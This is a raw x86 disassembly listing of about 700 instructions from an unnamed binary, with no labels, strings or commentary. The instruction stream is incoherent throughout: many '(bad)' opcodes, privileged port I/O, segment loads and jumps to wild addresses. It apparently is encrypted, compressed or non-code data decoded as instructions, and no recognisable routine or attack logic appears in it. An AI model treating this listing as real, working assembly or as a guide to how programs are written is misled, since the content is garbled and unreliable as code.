  407e82:	sbb    BYTE PTR [esi],dl
  407e84:	adc    esi,edx
  407e86:	add    bh,BYTE PTR [esi]
  407e88:	push   eax
  407e89:	adc    DWORD PTR [edx-0x571a6036],esp
  407e8f:	daa    
  407e90:	(bad)  
  407e91:	inc    ebp
  407e92:	cmc    
  407e93:	pop    edx
  407e94:	and    eax,0x1a8c9d95
  407e99:	dec    ebp
  407e9a:	dec    ebp
  407e9b:	clc    
  407e9c:	inc    edi
  407e9d:	mov    bh,0x1d
  407e9f:	je     0x407e7e
  407ea1:	jmp    0x526f5901
  407ea6:	repnz aaa 
  407ea8:	mov    DWORD PTR [ecx+0x7e],ebx
  407eab:	jl     0x407e82
  407ead:	jb     0x407e50
  407eaf:	shl    DWORD PTR [edi+0x32aad7a9],1
  407eb5:	pop    edi
  407eb6:	mov    eax,0x3ec38975
  407ebb:	or     dh,BYTE PTR ds:0x192d4faa
  407ec1:	pop    ss
  407ec2:	sti    
  407ec3:	jb     0x407ecf
  407ec5:	dec    esp
  407ec6:	sbb    DWORD PTR [edx-0x17],esi
  407ec9:	nop
  407eca:	pop    edi
  407ecb:	test   eax,0x18f3b07
  407ed0:	mov    eax,ds:0xa87e1aa5
  407ed5:	int    0xa0
  407ed7:	shl    BYTE PTR ds:0xf4ae73b0,0xf6
  407ede:	test   eax,0x2b2545ff
  407ee3:	mov    dh,0x84
  407ee5:	into   
  407ee6:	pop    ds
  407ee7:	psubusw mm1,QWORD PTR ds:0x2c7a075
  407eee:	xchg   ebp,eax
  407eef:	adc    ebp,DWORD PTR ds:0x5609acd2
  407ef5:	sub    ecx,DWORD PTR [eax+0x1b]
  407ef8:	je     0x407edb
  407efa:	lock jae 0x407f4d
  407efd:	sbb    eax,0x8d7cb2b7
  407f02:	add    esp,0x3cd2c7d3
  407f08:	(bad)  
  407f09:	pop    ebp
  407f0a:	(bad)  
  407f0b:	pop    ss
  407f0c:	in     al,dx
  407f0d:	cmp    eax,0x6950cc3c
  407f12:	in     eax,0xfe
  407f14:	jle    0x407f18
  407f16:	adc    al,0x8c
  407f18:	popa   
  407f19:	add    BYTE PTR [edx+0x4e0f56f6],bl
  407f1f:	add    BYTE PTR [esi],0x5
  407f22:	or     eax,0xffd72f5a
  407f27:	out    0xa3,eax
  407f29:	imul   esp,DWORD PTR [edi-0x18a9a5d],0xffffff8a
  407f30:	and    DWORD PTR [edi+0x7030fd6b],edx
  407f36:	push   edi
  407f37:	ret    
  407f38:	sbb    DWORD PTR [edi],0x2459e715
  407f3e:	and    BYTE PTR [eax-0x5afa7c8b],cl
  407f44:	pop    eax
  407f45:	adc    BYTE PTR [edi+0x2a45730e],cl
  407f4b:	cmc    
  407f4c:	data16 or al,0xa4
  407f4f:	int3   
  407f50:	mov    cl,0x77
  407f52:	sbb    al,0x29
  407f54:	dec    edi
  407f55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f56:	jecxz  0x407f95
  407f58:	int3   
  407f59:	outs   dx,DWORD PTR ds:[esi]
  407f5a:	dec    ecx
  407f5b:	sbb    eax,0xab7a8cf3
  407f60:	sub    esp,DWORD PTR [ebp-0x28]
  407f63:	sub    DWORD PTR [ebp+0x4d80067d],ebx
  407f69:	and    eax,0xaa0f6aa7
  407f6e:	shl    BYTE PTR [ebx+0x1bb0e021],cl
  407f74:	cld    
  407f75:	ret    0xb776
  407f78:	(bad)  
  407f79:	jge    0x407f7f
  407f7b:	mul    DWORD PTR [edi-0x2332b658]
  407f81:	sub    DWORD PTR [eax+0x3f1736c3],eax
  407f87:	pop    edi
  407f88:	dec    ecx
  407f89:	test   al,0x86
  407f8b:	jl     0x407f59
  407f8d:	mov    al,0x64
  407f8f:	cmp    DWORD PTR [ecx],0xffffffeb
  407f92:	pop    esp
  407f93:	leave  
  407f94:	sub    BYTE PTR [ecx*1+0x5749397f],dh
  407f9b:	cmc    
  407f9c:	cld    
  407f9d:	push   cs
  407f9e:	lds    edi,FWORD PTR [edx]
  407fa0:	cli    
  407fa1:	shl    DWORD PTR [edx+ecx*4+0x7b6bb653],1
  407fa8:	inc    esi
  407fa9:	out    dx,al
  407faa:	jo     0x407f3c
  407fac:	sbb    eax,0xc2369c9e
  407fb1:	pop    ss
  407fb2:	xor    DWORD PTR ds:0xd4c59207,ebp
  407fb8:	neg    BYTE PTR [ebx+0x4d]
  407fbb:	sub    eax,0xa1edc9b2
  407fc0:	test   DWORD PTR [esi+0x78982c90],edi
  407fc6:	scas   al,BYTE PTR es:[edi]
  407fc7:	out    0xe4,al
  407fc9:	addr16 jne 0x407f7e
  407fcc:	retf   
  407fcd:	addr16 and eax,ebp
  407fd0:	and    cl,BYTE PTR [esi+0x76438237]
  407fd6:	mov    edi,0xbe2b96c4
  407fdb:	mov    ds:0xf184d300,eax
  407fe0:	je     0x407f8a
  407fe2:	pop    edx
  407fe3:	fcmovne st,st(3)
  407fe5:	xchg   edi,eax
  407fe6:	sar    BYTE PTR ds:[ecx],cl
  407fe9:	stos   BYTE PTR es:[edi],al
  407fea:	xchg   ecx,eax
  407feb:	jl     0x407fc2
  407fed:	pop    eax
  407fee:	mov    ecx,0xa58745e6
  407ff3:	sti    
  407ff4:	out    dx,eax
  407ff5:	pop    edx
  407ff6:	cld    
  407ff7:	add    eax,0xcd22ac52
  407ffc:	sub    DWORD PTR [eax+0x4a],edx
  407fff:	out    0x51,eax
  408001:	mov    eax,0x8c726542
  408006:	loopne 0x407fdb
  408008:	stos   BYTE PTR es:[edi],al
  408009:	ret    
  40800a:	fist   WORD PTR [ebx+0x9ed2368]
  408010:	repnz lea edi,[ecx-0x2]
  408014:	dec    edi
  408015:	xor    DWORD PTR [esi+edi*1-0x51],0x6c98e314
  40801d:	pop    ss
  40801e:	or     DWORD PTR [ebx],esi
  408020:	pop    ebp
  408021:	adc    BYTE PTR [ebp-0x34],cl
  408024:	sub    DWORD PTR [edi],esp
  408026:	test   DWORD PTR [eax-0x70],eax
  408029:	push   es
  40802a:	cmc    
  40802b:	and    ch,ah
  40802d:	jl     0x40809c
  40802f:	jg     0x40802c
  408031:	jle    0x407fcb
  408033:	mov    ds:0x577be856,eax
  408038:	pop    edi
  408039:	xor    BYTE PTR [ebx-0x72],bh
  40803c:	xchg   ebx,eax
  40803d:	mov    dl,0x5d
  40803f:	data16 sahf 
  408041:	sbb    DWORD PTR ds:0xcf017b34,edx
  408047:	hlt    
  408048:	push   esi
  408049:	cld    
  40804a:	xchg   ebp,eax
  40804b:	lods   al,BYTE PTR ds:[esi]
  40804c:	ror    eax,0xa4
  40804f:	add    eax,DWORD PTR [esi]
  408051:	pop    esi
  408052:	imul   edx,DWORD PTR [esp+ebx*4-0x56],0x91eb48ba
  40805a:	and    ch,al
  40805c:	lods   al,BYTE PTR ds:[esi]
  40805d:	sub    ch,cl
  40805f:	pop    ebx
  408060:	lock jmp 0x40806a
  408063:	imul   ebp,DWORD PTR [ecx+0x7a716a33],0x1efee81c
  40806d:	imul   ebp,eax,0xcf82e3b7
  408073:	inc    ebp
  408074:	mov    ecx,0xd9f2c3e0
  408079:	adc    dl,BYTE PTR es:[ebp-0x16e28e5a]
  408080:	mov    ch,BYTE PTR [edx-0x6f]
  408083:	add    dh,ch
  408085:	data16 xor al,0xe0
  408088:	fnsave [eax]
  40808a:	jp     0x408104
  40808c:	stos   BYTE PTR es:[edi],al
  40808d:	cmp    ebp,eax
  40808f:	sub    BYTE PTR [eax-0x3bd9031d],ch
  408095:	jno    0x408068
  408097:	scas   eax,DWORD PTR es:[edi]
  408098:	sub    eax,ebp
  40809a:	xor    ch,BYTE PTR [ebp+0x7f]
  40809d:	ins    BYTE PTR es:[edi],dx
  40809e:	std    
  40809f:	mov    ecx,0x8dd51701
  4080a4:	sbb    BYTE PTR [ebp-0x62],dh
  4080a7:	sub    edi,DWORD PTR [edi-0x5951c8f8]
  4080ad:	mov    dl,0xa0
  4080af:	pop    ebx
  4080b0:	jg     0x408121
  4080b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080b3:	jae    0x4080b6
  4080b5:	push   ds
  4080b6:	jb     0x40809f
  4080b8:	fst    QWORD PTR [edi]
  4080ba:	dec    ebp
  4080bb:	xor    al,0x38
  4080bd:	xor    DWORD PTR [ecx+0xde0866e],0x317fcad0
  4080c7:	fprem1 
  4080c9:	imul   ecx,DWORD PTR [ebp-0x6cb8960e],0xf6d1cc4b
  4080d3:	(bad)  
  4080d4:	xor    al,0x8b
  4080d6:	(bad)  
  4080d7:	fwait
  4080d8:	enter  0xfc27,0x1b
  4080dc:	xchg   edi,eax
  4080dd:	lock adc BYTE PTR [ebp+edi*2-0x7d],dl
  4080e2:	bound  esp,QWORD PTR [ecx-0x7ccdab65]
  4080e8:	dec    ebp
  4080e9:	pop    eax
  4080ea:	in     al,0x15
  4080ec:	retf   
  4080ed:	jo     0x4080c7
  4080ef:	and    bh,ch
  4080f1:	ret    
  4080f2:	sar    DWORD PTR [ecx-0x2c32591a],0x85
  4080f9:	mov    bh,0xab
  4080fb:	or     al,0x36
  4080fd:	bound  esi,QWORD PTR [edi+0x28]
  408100:	mov    edx,0x254cad3c
  408105:	sub    al,BYTE PTR [ecx]
  408107:	je     0x408116
  408109:	push   esi
  40810a:	cmp    BYTE PTR [ecx+0x25],0x9e
  40810e:	mov    esi,edx
  408110:	mov    ebx,0xf7551ba0
  408115:	dec    esi
  408116:	or     edx,ebp
  408118:	mov    cl,0x16
  40811a:	and    eax,0x33d1ba70
  40811f:	push   cs
  408120:	dec    edi
  408121:	mov    dl,0x31
  408123:	mov    bl,0x91
  408125:	push   eax
  408126:	add    edi,DWORD PTR ds:0xca5d19c6
  40812c:	mov    fs,WORD PTR [ebx-0x2b]
  40812f:	sbb    eax,edx
  408131:	pmaxsw mm2,QWORD PTR [ebx-0x43d86255]
  408138:	pushf  
  408139:	or     BYTE PTR [ecx],ah
  40813b:	sbb    edi,DWORD PTR [edi+0x37b099a2]
  408141:	and    al,0x9e
  408143:	xchg   BYTE PTR [edx],cl
  408145:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408146:	push   esp
  408147:	add    DWORD PTR fs:[eax+0x62],ebp
  40814b:	fdivr  QWORD PTR ds:0xd0368e3e
  408151:	cs or  al,0x2f
  408154:	hlt    
  408155:	and    al,BYTE PTR [ecx+0x68]
  408158:	imul   esi,DWORD PTR [eax-0x65544554],0xaec26b15
  408162:	pop    ebp
  408163:	push   edx
  408164:	mov    ebp,0x2d132c14
  408169:	mov    edx,0xf5cecb2c
  40816e:	ins    BYTE PTR es:[edi],dx
  40816f:	sub    eax,0x4cb4d683
  408174:	add    BYTE PTR [ebx+0x4eb83d1f],bh
  40817a:	in     eax,0xd9
  40817c:	add    BYTE PTR [ebx],0xad
  40817f:	aas    
  408180:	fsubr  QWORD PTR [ecx+0x27d7574]
  408186:	dec    ecx
  408187:	xor    eax,0xc591b773
  40818c:	pop    ss
  40818d:	test   al,0xf3
  40818f:	jl     0x408152
  408191:	mov    ch,0x17
  408193:	pop    edi
  408194:	or     dh,ch
  408196:	pop    esp
  408197:	push   dx
  408199:	add    BYTE PTR [ecx+0x55a38bf],0x71
  4081a0:	mov    ebp,0x993571c4
  4081a5:	fidivr WORD PTR [ebx+ecx*1+0x38f63c26]
  4081ac:	adc    ebp,DWORD PTR [esi+0x7834f159]
  4081b2:	shr    DWORD PTR [edx+0x2b4c5ad2],0x9b
  4081b9:	xor    al,0xbb
  4081bb:	test   dh,cl
  4081bd:	call   0xba5bc5a1
  4081c2:	rcr    DWORD PTR [esi+0x74],cl
  4081c5:	icebp  
  4081c6:	mov    edi,0xfae4c137
  4081cb:	mov    ss,WORD PTR cs:[eax]
  4081ce:	int    0x1c
  4081d0:	int3   
  4081d1:	push   ecx
  4081d2:	lock daa 
  4081d4:	xor    BYTE PTR [edi],dl
  4081d6:	cmc    
  4081d7:	shr    BYTE PTR [esi+0x44b439ac],0x5f
  4081de:	adc    dh,BYTE PTR [edi]
  4081e0:	out    0xa0,eax
  4081e2:	fcomp  DWORD PTR [esi]
  4081e4:	imul   edx,eax,0xffffffa6
  4081e7:	sub    al,cl
  4081e9:	add    BYTE PTR [ecx+edx*1+0x1b1a84a],bh
  4081f0:	sbb    BYTE PTR ds:0x1fecaee0,cl
  4081f6:	loopne 0x4081b9
  4081f8:	sar    edi,0xa2
  4081fb:	or     ebp,0xffffff86
  4081fe:	shr    DWORD PTR [esi],cl
  408200:	cld    
  408201:	imul   ebp,DWORD PTR [ebp+0x72900e45],0x626346de
  40820b:	mov    WORD PTR [edx+ebx*2-0x54161803],ss
  408212:	repnz mov edi,0x1f119be
  408218:	xchg   edx,eax
  408219:	inc    ebp
  40821a:	dec    edi
  40821b:	sub    ah,bl
  40821d:	ror    DWORD PTR [esi],cl
  40821f:	mov    ebp,0x9009694d
  408224:	(bad)  [esi-0x18]
  408227:	sbb    eax,0xa8411f0b
  40822c:	bound  ecx,QWORD PTR [eax]
  40822e:	jmp    0x40822f
  408230:	jle    0x4081d7
  408232:	mov    edx,0x9f086c69
  408237:	std    
  408238:	mov    al,ds:0xe9d7f328
  40823d:	adc    eax,DWORD PTR [edx+edi*1+0x66167233]
  408244:	dec    eax
  408245:	or     BYTE PTR [esi+0x31],ch
  408248:	stos   BYTE PTR es:[edi],al
  408249:	je     0x40820b
  40824b:	add    ebx,DWORD PTR [edx-0x377f3efb]
  408251:	in     al,dx
  408252:	push   ebp
  408253:	cmp    al,0xe
  408255:	xor    al,0xd5
  408257:	lock push ebp
  408259:	inc    edi
  40825a:	in     al,0xb9
  40825c:	imul   ebp,eax,0x660e0805
  408262:	adc    DWORD PTR ds:0xe63dab81,0x61
  408269:	cmc    
  40826a:	imul   ebx,DWORD PTR [ebp+0x33710d27],0x67
  408271:	leave  
  408272:	fcmovu st,st(1)
  408274:	hlt    
  408275:	jp     0x408257
  408277:	and    eax,0x581a6f2d
  40827c:	adc    eax,DWORD PTR [ebx+esi*4-0x80]
  408280:	test   eax,0xb72413f3
  408285:	or     BYTE PTR [edi-0xd],dh
  408288:	leave  
  408289:	jne    0x40821a
  40828b:	sti    
  40828c:	mov    ds:0xb3740547,ax
  408292:	cmp    edx,DWORD PTR [esi-0x35cc9622]
  408298:	loop   0x40823c
  40829a:	dec    eax
  40829b:	xchg   esi,eax
  40829c:	sub    al,0x28
  40829e:	sbb    ah,BYTE PTR [esi+0x116e14cd]
  4082a4:	xlat   BYTE PTR ds:[ebx]
  4082a5:	mov    BYTE PTR [esi],cl
  4082a7:	push   edx
  4082a8:	(bad)  
  4082a9:	sbb    al,0x9e
  4082ab:	jns    0x4082d1
  4082ad:	xchg   edx,eax
  4082ae:	(bad)  
  4082af:	ficomp WORD PTR [esp+edi*4-0x4b]
  4082b3:	xor    DWORD PTR [ecx-0x3200a7a5],ecx
  4082b9:	loop   0x40831b
  4082bb:	cvtdq2ps xmm6,XMMWORD PTR [eax]
  4082be:	pop    es
  4082bf:	mov    DWORD PTR cs:[esi],eax
  4082c2:	fdivr  QWORD PTR [ebp+0x54d9f802]
  4082c8:	mov    bh,0x5d
  4082ca:	iret   
  4082cb:	sub    al,0x46
  4082cd:	repz cmp DWORD PTR [ebp-0x1b355f53],ecx
  4082d4:	pop    ebp
  4082d5:	jl     0x4082de
  4082d7:	das    
  4082d8:	xchg   esp,eax
  4082d9:	xchg   ebx,eax
  4082da:	sbb    al,0xf3
  4082dc:	jns    0x408309
  4082de:	(bad)  
  4082df:	jo     0x408308
  4082e1:	retw   
  4082e3:	xchg   ebp,eax
  4082e4:	gs mov esi,0xb786ccc4
  4082ea:	add    ebp,DWORD PTR [ecx]
  4082ec:	mov    esi,0xecb65bbe
  4082f1:	in     al,0x2a
  4082f3:	jmp    0x81eefeba
  4082f8:	jmp    DWORD PTR [ebx+0x62]
  4082fb:	cmp    DWORD PTR [ecx],edx
  4082fd:	inc    ebp
  4082fe:	mov    al,0x62
  408300:	test   al,0xdd
  408302:	repz scas al,BYTE PTR es:[edi]
  408304:	loop   0x4082d2
  408306:	mov    cl,0x9a
  408308:	ret    0xd955
  40830b:	pushf  
  40830c:	mov    eax,ds:0xd5499c9c
  408311:	dec    ebp
  408312:	push   cs
  408313:	(bad)  
  408315:	imul   edx,DWORD PTR [ecx],0x43
  408318:	pop    edx
  408319:	jg     0x4082ea
  40831b:	stos   DWORD PTR es:[edi],eax
  40831c:	arpl   sp,bx
  40831e:	scas   eax,DWORD PTR es:[edi]
  40831f:	jecxz  0x408306
  408321:	lock xor al,0x18
  408324:	adc    BYTE PTR [bx],0xd9
  408328:	xor    BYTE PTR [edi-0x27b7b260],dh
  40832e:	jp     0x40832b
  408330:	xchg   esi,eax
  408331:	div    dl
  408333:	arpl   WORD PTR [edx],sp
  408335:	mov    DWORD PTR [ebx-0x3e098ea0],ebp
  40833b:	mov    eax,0xdbd8aa10
  408340:	cmp    BYTE PTR [edx-0x27],al
  408343:	mov    ebx,0x75319dac
  408348:	outs   dx,BYTE PTR ds:[esi]
  408349:	cdq    
  40834a:	pop    esi
  40834b:	outs   dx,BYTE PTR ds:[esi]
  40834c:	mov    DWORD PTR [ebx],0xf1bef41
  408352:	in     al,0x3f
  408354:	frndint 
  408356:	push   ds
  408357:	data16 jae 0x4083d8
  40835a:	repnz push ebp
  40835c:	data16 ja 0x408385
  40835f:	enter  0xb4af,0x39
  408363:	les    esp,FWORD PTR [edi+0x19]
  408366:	mov    ds:0x9f02bb9e,al
  40836b:	push   esp
  40836c:	(bad)  
  40836d:	mov    dl,0xf1
  40836f:	int3   
  408370:	bnd jnp 0x408384
  408373:	adc    al,BYTE PTR [esi+0x27]
  408376:	mov    ds:0xfc4f5e6c,eax
  40837b:	test   BYTE PTR ds:0xe28d4283,bh
  408381:	jbe    0x4083a7
  408383:	xor    DWORD PTR [edi],edx
  408385:	push   es
  408386:	sbb    DWORD PTR [eax-0x7809d2c0],esp
  40838c:	inc    edx
  40838d:	cmp    dl,0x47
  408390:	pop    ebx
  408391:	mov    eax,ds:0x6c5ac152
  408396:	gs out 0x7,eax
  408399:	jbe    0x4083d4
  40839b:	push   ecx
  40839c:	nop    DWORD PTR [ebx-0x5e]
  4083a0:	xchg   edx,eax
  4083a1:	push   0xc4887277
  4083a6:	lahf   
  4083a7:	ss push eax
  4083a9:	enter  0xb3c9,0xc2
  4083ad:	sti    
  4083ae:	(bad)  
  4083b0:	sbb    esp,ebp
  4083b2:	jge    0x408336
  4083b4:	jg     0x4083fd
  4083b6:	xor    al,0x1e
  4083b8:	xchg   ebx,eax
  4083b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083ba:	mov    eax,0x15854639
  4083bf:	jns    0x40839b
  4083c1:	retf   0x38bf
  4083c4:	pop    ebx
  4083c5:	sbb    BYTE PTR [eax-0x68],ah
  4083c8:	rcr    BYTE PTR [ebp+0x58],0xb0
  4083cc:	sub    eax,0x134175bd
  4083d1:	and    eax,0x6b2ba1e1
  4083d6:	test   eax,0xe242f88f
  4083db:	or     BYTE PTR [edx],ch
  4083dd:	das    
  4083de:	inc    ebx
  4083df:	pop    ebp
  4083e0:	lods   eax,DWORD PTR ds:[esi]
  4083e1:	mov    BYTE PTR [esi-0x1ecb80b1],ah
  4083e7:	(bad)  
  4083e8:	lock or ecx,DWORD PTR [ebx+edi*2]
  4083ec:	add    bh,bl
  4083ee:	scas   al,BYTE PTR es:[edi]
  4083ef:	(bad)  
  4083f0:	test   BYTE PTR [ebx],al
  4083f2:	(bad)  
  4083f3:	mov    edx,0xa3d1f4f1
  4083f8:	std    
  4083f9:	ror    DWORD PTR ss:[eax+0x54],0xae
  4083fe:	or     DWORD PTR [eax],0x25341a39
  408404:	out    dx,eax
  408405:	retf   
  408406:	inc    edi
  408407:	mov    esi,0xb9f3755b
  40840c:	sti    
  40840d:	mov    ds:0x3ac630b9,al
  408412:	mov    ecx,0x2c919a4a
  408417:	ins    DWORD PTR es:[edi],dx
  408418:	daa    
  408419:	pop    es
  40841a:	push   ecx
  40841b:	jae    0x408429
  40841d:	ds jns 0x40849f
  408420:	xor    al,0xc3
  408422:	adc    al,0x39
  408424:	xor    cl,BYTE PTR [esi+esi*1]
  408427:	sub    al,0xb3
  408429:	mov    ecx,0x93e42892
  40842e:	js     0x408410
  408430:	xor    ecx,DWORD PTR [esi]
  408432:	push   eax
  408433:	mov    BYTE PTR [ebx],ah
  408435:	xchg   edx,ebp
  408437:	jno    0x40849b
  408439:	push   esi
  40843a:	jp     0x4083df
  40843c:	mov    ah,0xb4
  40843e:	dec    ecx
  40843f:	sub    ebp,esi
  408441:	jae    0x4083f8
  408443:	(bad)  
  408444:	push   cs
  408445:	pop    esi
  408446:	pop    edx
  408447:	js     0x408444
  408449:	das    
  40844a:	es jmp 0x9002:0xeb0663d6
  408452:	or     al,0xb3
  408454:	popa   
  408455:	out    dx,eax
  408456:	stos   BYTE PTR es:[edi],al
  408457:	sub    edi,DWORD PTR [ebx-0x69]
  40845a:	adc    dh,dl
  40845c:	adc    esp,DWORD PTR [edi+ecx*8+0x2cf721cb]
  408463:	in     eax,0x7f
  408465:	pushf  
  408466:	retf   
  408467:	js     0x408487
  408469:	(bad)  
  40846a:	adc    ah,BYTE PTR [ecx]
  40846c:	or     DWORD PTR ds:0x9ce27013,ebp
  408472:	ins    DWORD PTR es:[edi],dx
  408473:	ds call 0x89b4d752
  408479:	(bad)  
  40847a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40847b:	push   esp
  40847c:	retf   
  40847d:	jno    0x408468
  40847f:	loopne 0x40848d
  408481:	jmp    0x97d7764d
  408486:	in     al,0xbc
  408488:	push   es
  408489:	adc    eax,0x661ab876
  40848e:	(bad)  
  40848f:	fild   DWORD PTR [ebp-0x21]
  408492:	dec    ecx
  408493:	xchg   edi,eax
  408494:	inc    edi
  408495:	jg     0x408425
  408497:	or     al,0x72
  408499:	in     al,dx
  40849a:	jnp    0x40841c
  40849c:	jg     0x4084d7
  40849e:	or     ah,ah
  4084a0:	fwait
  4084a1:	cmp    eax,ebx
  4084a3:	jg     0x408476
  4084a5:	push   ebx
  4084a6:	sahf   
  4084a7:	aad    0xb3
  4084a9:	lods   eax,DWORD PTR ds:[esi]
  4084aa:	pop    ds
  4084ab:	and    al,0x54
  4084ad:	test   ecx,0x532888fe
  4084b3:	mov    edi,0x6c49e837
  4084b8:	push   ebp
  4084b9:	cmp    BYTE PTR [ecx],ch
  4084bb:	xchg   esi,eax
  4084bc:	retf   0xce5b
  4084bf:	or     ecx,esp
  4084c1:	push   esi
  4084c2:	pop    esi
  4084c3:	sbb    esi,DWORD PTR [ebp-0x1e444e4]
  4084c9:	mov    ds:0x30333798,al
  4084ce:	lds    edx,FWORD PTR [ecx-0x1845eed2]
  4084d4:	lahf   
  4084d5:	sbb    al,0xf2
  4084d7:	xor    edi,edi
  4084d9:	sub    eax,0xcdd68b99
  4084de:	sub    al,0x78
  4084e0:	mov    esp,0x2fc023ec
  4084e5:	fcmovnb st,st(0)
  4084e7:	sbb    edx,DWORD PTR [ebp+0x387eeb08]
  4084ed:	rol    DWORD PTR [edi+0x1e],1
  4084f0:	or     DWORD PTR [edx],ebx
  4084f2:	enter  0xbbda,0x2f
  4084f6:	and    DWORD PTR [edx+0x74a23500],edi
  4084fc:	xor    al,0x88
  4084fe:	pop    ss
  4084ff:	xor    eax,DWORD PTR [ebp-0x4df8801e]
  408505:	xchg   ecx,eax
  408506:	dec    ebp
  408507:	mov    eax,0x93f6a5d2
  40850c:	arpl   WORD PTR [eax+0x5cd0c296],bp
  408512:	jge    0x408556
  408514:	mov    bh,0xb
  408516:	add    dl,bl
  408518:	in     eax,dx
  408519:	das    
  40851a:	inc    esp
  40851b:	xchg   edx,eax
  40851c:	neg    BYTE PTR [edx]
  40851e:	int3   
  40851f:	mov    esi,0x5f418fda
  408524:	xchg   ecx,eax
  408525:	aam    0xb
  408527:	cmp    eax,0xbd822f84
  40852c:	sub    BYTE PTR [ecx+0x19528925],bl
  408532:	lds    edx,FWORD PTR [esi+0x2d434c58]
  408538:	in     eax,dx
  408539:	xchg   ebp,eax
  40853a:	arpl   di,bp
  40853c:	push   ss
  40853d:	mov    fs,WORD PTR [edi+ebp*4+0x6405a4f4]
  408544:	and    BYTE PTR [esi],0x3f
  408547:	cmp    eax,0xe408153b
  40854c:	mov    ds,eax
  40854e:	cmp    eax,0xe745bf11
  408553:	jmp    0x2c0c6311
  408558:	pushf  
  408559:	(bad)  
  40855a:	xor    al,0x7b
  40855c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40855d:	fsincos 
  40855f:	jge    0x40851a
  408561:	sub    DWORD PTR [edi+0x6f],edi
  408564:	pop    ds
  408565:	popf   
  408566:	gs pop ebx
  408568:	out    dx,al
  408569:	jo     0x408592
  40856b:	cmp    ebx,DWORD PTR [eax-0x74]
  40856e:	lock inc edx
  408570:	fstp   QWORD PTR [eax+edx*2-0x47]
  408574:	jg     0x4085e5
  408576:	jns    0x4085dc
  408578:	pop    ebp
  408579:	sub    ah,BYTE PTR [edx-0x1a]
  40857c:	push   esp
  40857d:	and    BYTE PTR [eax+0x7d69dd5],ch
  408583:	imul   eax,DWORD PTR [esi-0x59],0xffffffff
  408587:	mov    edx,0x57f3377e
  40858c:	and    BYTE PTR [ebx-0x68],al
  40858f:	fwait
  408590:	xchg   edi,eax
  408591:	xchg   edx,eax
  408592:	shr    BYTE PTR [edx+0x6527b59e],1
  408598:	inc    ecx
  408599:	aas    
  40859a:	inc    esi
  40859b:	jmp    ecx
  40859d:	repnz mov ds:0x61f7c82f,al
  4085a3:	sub    eax,DWORD PTR [edx-0x247b4743]
  4085a9:	mov    bh,0x93
  4085ab:	pshufw mm7,QWORD PTR [ebx-0x16],0xc5
  4085b0:	xchg   bh,bl
  4085b2:	push   ebp
  4085b3:	xor    DWORD PTR es:[esi-0x7b91b94],0xffffff99
  4085bb:	fld    st(4)
  4085bd:	cmp    BYTE PTR [ecx+0x2b],0xd1
  4085c1:	bound  esp,QWORD PTR [ebp+0x6e]
  4085c4:	xchg   esp,eax
  4085c5:	dec    esi
  4085c6:	add    eax,DWORD PTR [ebp+0x2a]
  4085c9:	shl    DWORD PTR ds:0x96d9a836,0xa7
  4085d0:	stos   BYTE PTR es:[edi],al
  4085d1:	push   edx
  4085d2:	and    al,0x63
  4085d4:	xchg   BYTE PTR [ebx-0x4c],dl
  4085d7:	dec    edx
  4085d8:	lea    esp,[esp+eiz*8]
  4085db:	lea    eax,[edx]
  4085dd:	push   esi
  4085de:	inc    esi
  4085df:	int3   
  4085e0:	out    0xd3,eax
  4085e2:	jl     0x40865e
  4085e4:	aam    0xab
  4085e6:	inc    eax
  4085e7:	push   ebp
  4085e8:	pop    ds
  4085e9:	pop    ebp
  4085ea:	(bad)  
  4085eb:	mul    BYTE PTR [eax]
  4085ed:	(bad)  
  4085ee:	push   ecx
  4085ef:	imul   esp,esi,0xfffffff3
  4085f2:	xchg   ecx,eax
  4085f3:	das    
  4085f4:	in     eax,0x88
  4085f6:	or     DWORD PTR [eax+0x3d],0xffffff9c
  4085fa:	div    ah
  4085fc:	das    
  4085fd:	sbb    eax,0x7c492089
  408602:	daa    
  408603:	xor    DWORD PTR [ebp+0x3c709e23],esp
  408609:	add    ah,BYTE PTR [esi+0x4a]
  40860c:	xor    esp,edx
  40860e:	dec    BYTE PTR [eax]
  408610:	xor    al,0x16
  408612:	mov    ?,WORD PTR [ecx-0x2462eb73]
  408618:	push   edi
  408619:	jns    0x4085f6
  40861b:	cmp    eax,0x8b69c019
  408620:	in     eax,0x68
  408622:	in     eax,dx
  408623:	pop    eax
  408624:	enter  0xec34,0x72
  408628:	push   0x4eb2f9c
  40862d:	sbb    BYTE PTR [ecx-0x700194f4],0x76
  408634:	sub    al,0x68
  408636:	aaa    
  408637:	inc    ebp
  408638:	in     al,0xb4
  40863a:	jbe    0x4085dc
  40863c:	mov    ebx,0xc3718016
  408641:	repz mov dl,0x8e
  408644:	and    dl,ch
  408646:	mov    bl,0xf4
  408648:	int    0x22
  40864a:	repz in al,0xbc
  40864d:	adc    al,0x2e
  40864f:	test   eax,0x14c16ab4
  408654:	add    edi,DWORD PTR [ecx]
  408656:	hlt    
  408657:	pop    esp
  408658:	pop    ecx
  408659:	fs jbe 0x4086ca
  40865c:	mov    bl,BYTE PTR [ebx-0x7970285b]
  408662:	xlat   BYTE PTR ds:[ebx]
  408663:	lahf   
  408664:	fcom   DWORD PTR [esi-0x59866621]
  40866a:	mov    esp,0x2efb503
  40866f:	cs call 0x6c7ef71c
  408675:	mov    bl,0xba
  408677:	scas   al,BYTE PTR es:[edi]
  408678:	jp     0x408691
  40867a:	test   al,0x41
  40867c:	sub    eax,esp
  40867e:	adc    DWORD PTR [esi],ecx
  408680:	ret    0x5733
  408683:	in     al,0xf6
  408685:	xchg   ebp,eax
  408686:	jmp    0xb93eaff8
  40868b:	sbb    DWORD PTR [ecx+ebp*8-0x5e],ebx
  40868f:	jmp    0x4086e1
  408691:	into   
  408692:	dec    ecx
  408693:	inc    edx
  408694:	test   al,0x70
  408696:	push   edx
  408697:	sbb    DWORD PTR [esp+eiz*8+0x64c1b631],ebp
  40869e:	inc    ebx
  40869f:	(bad)  
  4086a0:	and    al,0xe2
  4086a2:	out    dx,eax
  4086a3:	mov    edx,0xd8cf09a3
  4086a8:	xor    esp,DWORD PTR [ebx+0x3cc7882d]
  4086ae:	scas   eax,DWORD PTR es:[edi]
  4086af:	adc    ebx,edi
  4086b1:	scas   al,BYTE PTR es:[edi]
  4086b2:	sbb    DWORD PTR [edx+0xb],esi
  4086b5:	add    DWORD PTR [ecx-0x1dec69fe],esi
